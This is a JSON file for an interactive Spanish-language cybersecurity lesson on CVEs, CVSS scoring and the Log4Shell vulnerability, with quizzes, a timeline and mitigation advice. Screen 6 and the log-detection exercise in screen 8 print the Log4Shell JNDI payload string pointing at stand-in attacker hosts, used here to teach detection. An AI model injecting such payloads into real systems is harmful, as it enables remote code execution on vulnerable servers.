{
  "id": "c1_l3",
  "title": "Vulnerabilidades y CVE",
  "description": "Caso Real: Log4Shell (Diciembre 2021)",
  "type": "interactive",
  "duration_minutes": 20,
  "xp_reward": 55,
  "order_index": 3,
  "course_id": 1,
  "total_screens": 18,
  "theme": {
    "primary_color": "#FF5722",
    "secondary_color": "#4CAF50",
    "accent_color": "#FFC107",
    "gradient": ["#1a1a2e", "#16213e", "#4a1c1c"]
  },
  "screens": [
    {
      "screen_id": 1,
      "type": "story_intro",
      "title": "Operaci√≥n: Log4Shell",
      "content": {
        "headline": "9 DICIEMBRE 2021",
        "subheadline": "La vulnerabilidad perfecta: 10/10 en severidad",
        "background_image": "server_room_red",
        "stats": [
          {"value": "10.0", "label": "CVSS Score"},
          {"value": "3B+", "label": "Dispositivos vulnerables"},
          {"value": "72hrs", "label": "Hasta explotaci√≥n masiva"}
        ],
        "cta_text": "Investigar Vulnerabilidad"
      }
    },
    {
      "screen_id": 2,
      "type": "story_slide",
      "title": "¬øQu√© es un CVE?",
      "content": {
        "icon": "badge",
        "icon_color": "#2196F3",
        "headline": "Common Vulnerabilities and Exposures",
        "body": "Un sistema de identificaci√≥n √∫nico para vulnerabilidades de seguridad. Cada vulnerabilidad conocida tiene un ID: CVE-A√ëO-N√öMERO.",
        "visual_element": {
          "type": "code_block",
          "content": "CVE-2021-44228\n‚îÇ      ‚îÇ    ‚îÇ\n‚îÇ      ‚îÇ    ‚îî‚îÄ‚îÄ N√∫mero secuencial\n‚îÇ      ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ A√±o de asignaci√≥n\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Prefijo est√°ndar"
        }
      }
    },
    {
      "screen_id": 3,
      "type": "flip_card_full",
      "title": "CVSS Score",
      "content": {
        "card": {
          "front": {
            "icon": "speed",
            "term": "CVSS",
            "subtitle": "Common Vulnerability Scoring System",
            "color": "#F44336"
          },
          "back": {
            "definition": "Sistema de puntuaci√≥n de 0 a 10 que mide la severidad de una vulnerabilidad",
            "scale": [
              {"range": "0.0", "label": "None", "color": "#9E9E9E"},
              {"range": "0.1-3.9", "label": "Low", "color": "#4CAF50"},
              {"range": "4.0-6.9", "label": "Medium", "color": "#FFC107"},
              {"range": "7.0-8.9", "label": "High", "color": "#FF9800"},
              {"range": "9.0-10.0", "label": "Critical", "color": "#F44336"}
            ],
            "log4shell_score": "10.0 - CRITICAL",
            "color": "#D32F2F"
          }
        }
      }
    },
    {
      "screen_id": 4,
      "type": "story_slide",
      "title": "Log4j: Ubicuo e Invisible",
      "content": {
        "icon": "code",
        "icon_color": "#FF5722",
        "headline": "Una librer√≠a en todas partes",
        "body": "Log4j es una librer√≠a de logging para Java. Est√° en millones de aplicaciones: Minecraft, Apple iCloud, Twitter, Steam, Amazon, y pr√°cticamente cualquier app Java empresarial.",
        "highlight_box": {
          "type": "warning",
          "text": "Si usas Java, probablemente usas Log4j. Y si usabas Log4j antes del 10 de diciembre 2021, eras vulnerable."
        }
      }
    },
    {
      "screen_id": 5,
      "type": "crisis_timeline",
      "title": "‚è±Ô∏è LA CARRERA CONTRA EL TIEMPO",
      "content": {
        "events": [
          {
            "time": "24 Nov",
            "icon": "bug_report",
            "title": "Alibaba reporta a Apache",
            "description": "Investigador de Alibaba Cloud descubre la vuln",
            "severity": "low"
          },
          {
            "time": "9 Dic",
            "icon": "public",
            "title": "Divulgaci√≥n p√∫blica",
            "description": "CVE-2021-44228 se hace p√∫blico. Parche disponible.",
            "severity": "high"
          },
          {
            "time": "10 Dic",
            "icon": "warning",
            "title": "Explotaci√≥n masiva comienza",
            "description": "Atacantes escanean todo internet",
            "severity": "critical"
          },
          {
            "time": "11 Dic",
            "icon": "trending_up",
            "title": "800,000 ataques detectados",
            "description": "En solo 72 horas",
            "severity": "critical"
          }
        ]
      }
    },
    {
      "screen_id": 6,
      "type": "story_slide",
      "title": "El Exploit: Tan Simple que Asusta",
      "content": {
        "icon": "terminal",
        "icon_color": "#F44336",
        "headline": "Una l√≠nea de c√≥digo",
        "body": "Solo necesitas que la aplicaci√≥n loggee este string:",
        "visual_element": {
          "type": "code_block",
          "content": "${jndi:ldap://attacker.com/exploit}",
          "language": "text"
        },
        "explanation": "Log4j procesa este string, contacta al servidor del atacante, descarga y ejecuta c√≥digo malicioso. Remote Code Execution (RCE) instant√°neo."
      }
    },
    {
      "screen_id": 7,
      "type": "crisis_decision",
      "title": "üö® ALERTA DE SEGURIDAD",
      "content": {
        "scenario": "Es 10 de diciembre 2021. Tu equipo confirma que 47 aplicaciones en producci√≥n usan Log4j vulnerable. No hay parche probado a√∫n. ¬øQu√© haces?",
        "timer_seconds": 25,
        "options": [
          {
            "id": "mitigate",
            "text": "Aplicar mitigaci√≥n temporal (deshabilitar JNDI lookup)",
            "icon": "shield",
            "is_correct": true,
            "consequence": {
              "title": "Respuesta Correcta",
              "description": "La mitigaci√≥n temporal (log4j2.formatMsgNoLookups=true) bloquea el vector de ataque mientras pruebas el parche.",
              "impact_score": 100
            }
          },
          {
            "id": "patch_immediate",
            "text": "Parchear en producci√≥n inmediatamente sin testing",
            "icon": "update",
            "is_correct": false,
            "consequence": {
              "title": "Riesgoso",
              "description": "Parchear sin testing puede romper aplicaciones cr√≠ticas. La mitigaci√≥n temporal es m√°s segura mientras pruebas.",
              "impact_score": 40
            }
          },
          {
            "id": "wait",
            "text": "Esperar a que el equipo de desarrollo pruebe el parche",
            "icon": "schedule",
            "is_correct": false,
            "consequence": {
              "title": "Demasiado Lento",
              "description": "Cada hora sin mitigaci√≥n = miles de intentos de explotaci√≥n. No puedes esperar d√≠as para testing normal.",
              "impact_score": -60
            }
          }
        ]
      }
    },
    {
      "screen_id": 8,
      "type": "log_hunter",
      "title": "üîç Detecta el Ataque",
      "content": {
        "instruction": "Revisa estos logs. ¬øCu√°les muestran intentos de explotar Log4Shell?",
        "logs": [
          {"id": 1, "timestamp": "12:01:23", "text": "INFO: User login successful - admin@company.com", "suspicious": false},
          {"id": 2, "timestamp": "12:01:24", "text": "WARN: ${jndi:ldap://185.234.x.x/a}", "suspicious": true},
          {"id": 3, "timestamp": "12:01:25", "text": "INFO: Page view /products/item123", "suspicious": false},
          {"id": 4, "timestamp": "12:01:26", "text": "ERROR: ${jndi:ldap://evil.com/exp}", "suspicious": true},
          {"id": 5, "timestamp": "12:01:27", "text": "DEBUG: Database connection established", "suspicious": false},
          {"id": 6, "timestamp": "12:01:28", "text": "INFO: User-Agent: ${jndi:dns://callback.attacker.io}", "suspicious": true}
        ],
        "hints": [
          "El patr√≥n ${jndi: es la firma del ataque",
          "Puede aparecer en cualquier campo que se loggee",
          "User-Agent, headers, par√°metros URL son vectores comunes"
        ],
        "success_threshold": 3,
        "xp_reward": 25
      }
    },
    {
      "screen_id": 9,
      "type": "flip_card_full",
      "title": "Ciclo de Vida de Vulnerabilidad",
      "content": {
        "card": {
          "front": {
            "icon": "loop",
            "term": "VULNERABILITY LIFECYCLE",
            "subtitle": "Del descubrimiento al parche",
            "color": "#673AB7"
          },
          "back": {
            "stages": [
              {"step": 1, "name": "Discovery", "desc": "Investigador encuentra el bug"},
              {"step": 2, "name": "Report", "desc": "Reporte responsable al vendor"},
              {"step": 3, "name": "Patch Dev", "desc": "Vendor desarrolla la soluci√≥n"},
              {"step": 4, "name": "Disclosure", "desc": "CVE publicado + parche disponible"},
              {"step": 5, "name": "Patch Deploy", "desc": "Usuarios aplican el parche"}
            ],
            "danger_zone": "Entre Disclosure y Patch Deploy est√° la ventana de ataque. Con Log4Shell fue <72 horas.",
            "color": "#512DA8"
          }
        }
      }
    },
    {
      "screen_id": 10,
      "type": "swipe_cards",
      "title": "Responsible Disclosure",
      "content": {
        "instruction": "¬øEs esta pr√°ctica de divulgaci√≥n responsable?",
        "cards": [
          {
            "id": 1,
            "scenario": "Investigador encuentra bug, reporta al vendor, espera 90 d√≠as antes de publicar",
            "correct_answer": "right",
            "labels": {"left": "Irresponsable", "right": "Responsable"}
          },
          {
            "id": 2,
            "scenario": "Hacker encuentra bug y lo vende en el mercado negro inmediatamente",
            "correct_answer": "left",
            "labels": {"left": "Irresponsable", "right": "Responsable"}
          },
          {
            "id": 3,
            "scenario": "Vendor ignora reportes por 6 meses, investigador publica para forzar acci√≥n",
            "correct_answer": "right",
            "labels": {"left": "Irresponsable", "right": "Responsable"}
          },
          {
            "id": 4,
            "scenario": "Publicar exploit funcional junto con la divulgaci√≥n inicial",
            "correct_answer": "left",
            "labels": {"left": "Irresponsable", "right": "Responsable"}
          }
        ],
        "xp_per_correct": 8
      }
    },
    {
      "screen_id": 11,
      "type": "slider_balance",
      "title": "Ventana de Parche",
      "content": {
        "scenario": "Una vulnerabilidad cr√≠tica (CVSS 10.0) es publicada. ¬øEn cu√°nto tiempo aplicas la mitigaci√≥n?",
        "left_option": {
          "label": "Inmediato (<24 horas)",
          "icon": "flash_on",
          "consequences": [
            "‚úÖ Bloquea la mayor√≠a de ataques masivos",
            "‚úÖ Reduce dr√°sticamente la superficie de riesgo",
            "‚ùå Alto estr√©s para el equipo de operaciones"
          ]
        },
        "right_option": {
          "label": "Est√°ndar (>72 horas)",
          "icon": "schedule",
          "consequences": [
            "‚úÖ Permite pruebas de regresi√≥n completas",
            "‚ùå Demasiado lento para exploits automatizados",
            "‚ùå En 72h, Log4Shell tuvo 800k intentos de ataque"
          ]
        },
        "explanation": "Para vulnerabilidades cr√≠ticas (CVSS 9+), la regla de oro es: Mitigaci√≥n temporal en 24h, parche completo en 72h. Los atacantes no esperan al lunes."
      }
    },
    {
      "screen_id": 12,
      "type": "drag_drop_match",
      "title": "CVSS: Clasifica la Severidad",
      "content": {
        "instruction": "Arrastra cada vulnerabilidad a su nivel de severidad CVSS",
        "scenarios": [
          {"id": 1, "text": "Log4Shell: RCE sin autenticaci√≥n, explotaci√≥n trivial", "correct_target": "critical"},
          {"id": 2, "text": "XSS reflejado que requiere interacci√≥n del usuario", "correct_target": "medium"},
          {"id": 3, "text": "Filtraci√≥n de versi√≥n de software en headers", "correct_target": "low"},
          {"id": 4, "text": "SQL Injection en panel de admin con autenticaci√≥n", "correct_target": "high"},
          {"id": 5, "text": "DoS que requiere acceso f√≠sico al servidor", "correct_target": "low"}
        ],
        "targets": [
          {"id": "low", "label": "Low (0-3.9)", "color": "#4CAF50"},
          {"id": "medium", "label": "Medium (4-6.9)", "color": "#FFC107"},
          {"id": "high", "label": "High (7-8.9)", "color": "#FF9800"},
          {"id": "critical", "label": "Critical (9-10)", "color": "#F44336"}
        ],
        "xp_per_correct": 6
      }
    },
    {
      "screen_id": 13,
      "type": "story_slide",
      "title": "Zero-Day vs N-Day",
      "content": {
        "icon": "schedule",
        "icon_color": "#9C27B0",
        "headline": "La diferencia cr√≠tica",
        "body": "Zero-Day: Vulnerabilidad sin parche disponible. El vendor no sabe o no ha tenido tiempo de parchear. N-Day: Parche existe pero no todos lo han aplicado.",
        "comparison": {
          "zero_day": {
            "label": "Zero-Day",
            "description": "Parche no existe",
            "danger": "M√°ximo",
            "defense": "Mitigaciones, detection"
          },
          "n_day": {
            "label": "N-Day", 
            "description": "Parche existe hace N d√≠as",
            "danger": "Depende de tu velocidad de parcheo",
            "defense": "Parchea ya"
          }
        }
      }
    },
    {
      "screen_id": 14,
      "type": "timed_quiz",
      "title": "‚ö° Quick Check",
      "content": {
        "timer_seconds": 15,
        "question": "Log4Shell fue publicado el 9 de diciembre con parche disponible. El 12 de diciembre, ¬øes zero-day o n-day?",
        "options": [
          {"id": "a", "text": "Zero-Day", "is_correct": false},
          {"id": "b", "text": "N-Day (3-day)", "is_correct": true},
          {"id": "c", "text": "Ninguno", "is_correct": false},
          {"id": "d", "text": "Ambos", "is_correct": false}
        ],
        "explanation": "Desde que existe un parche, ya no es zero-day. Es N-day donde N = d√≠as desde que el parche est√° disponible. El 12 de diciembre, Log4Shell era un 3-day.",
        "xp_reward": 15
      }
    },
    {
      "screen_id": 15,
      "type": "story_slide",
      "title": "El Impacto Real",
      "content": {
        "icon": "public",
        "icon_color": "#F44336",
        "headline": "Organizaciones afectadas",
        "body": "Log4Shell afect√≥ a pr√°cticamente todas las empresas Fortune 500 que usan Java.",
        "impact_list": [
          {"icon": "cloud", "text": "AWS, Azure, GCP - Servicios vulnerables"},
          {"icon": "games", "text": "Minecraft - Vector de ataque inicial"},
          {"icon": "apple", "text": "Apple iCloud - Vulnerable"},
          {"icon": "business", "text": "VMware, Cisco, IBM - Parches de emergencia"}
        ]
      }
    },
    {
      "screen_id": 16,
      "type": "summary_stats",
      "title": "Log4Shell: Balance Final",
      "content": {
        "stats": [
          {"icon": "warning", "value": "10.0", "label": "CVSS Score"},
          {"icon": "devices", "value": "3B+", "label": "Dispositivos vulnerables"},
          {"icon": "schedule", "value": "72h", "label": "Hasta explotaci√≥n masiva"},
          {"icon": "update", "value": "4", "label": "Parches necesarios (bypasses)"}
        ],
        "key_insight": "Log4Shell demostr√≥ que dependencias de terceros son vectores cr√≠ticos. La mayor√≠a de empresas no sab√≠an que usaban Log4j.",
        "lessons": [
          "Mant√©n un inventario de dependencias (SBOM)",
          "Monitorea CVEs de tus librer√≠as",
          "Ten un proceso de parche de emergencia"
        ]
      }
    },
    {
      "screen_id": 17,
      "type": "achievement_unlock",
      "title": "Logro Desbloqueado",
      "content": {
        "achievement": {
          "icon": "bug_report",
          "name": "Vulnerability Hunter",
          "description": "Dominas CVEs, CVSS y ciclos de vida de vulnerabilidades",
          "rarity": "uncommon",
          "color": "#FF5722"
        }
      }
    },
    {
      "screen_id": 18,
      "type": "lesson_complete",
      "title": "Lecci√≥n Completada",
      "content": {
        "xp_earned": 55,
        "key_takeaways": [
          "CVE es el sistema est√°ndar de identificaci√≥n de vulnerabilidades",
          "CVSS (0-10) mide la severidad; 9+ es cr√≠tico",
          "Zero-day = sin parche; N-day = parche existe hace N d√≠as",
          "Para cr√≠ticos: mitigaci√≥n en 24h, parche en 72h"
        ],
        "next_lesson": {
          "id": "c1_l4",
          "title": "Malware y T√©cnicas de Ataque",
          "preview": "Anatom√≠a de WannaCry: c√≥mo funciona el ransomware"
        }
      }
    }
  ]
}